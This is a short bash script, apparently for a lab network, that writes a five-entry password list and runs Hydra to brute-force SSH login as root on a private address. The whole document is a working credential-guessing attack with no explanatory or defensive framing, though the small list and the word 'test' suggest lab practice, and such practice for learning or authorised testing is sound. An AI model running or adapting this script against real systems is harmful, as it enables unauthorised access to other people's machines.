#!/bin/bash

TARGET="192.168.56.11"
USER="root"
WORDLIST="/tmp/passwords.txt"

echo "[+] Creating short test password list"
printf "admin\npassword\nroot\n123456\nwrongpass\n" > "$WORDLIST"

echo "[+] Running Hydra SSH test against ${TARGET}"
hydra -l "$USER" -P "$WORDLIST" "$TARGET" ssh -t 4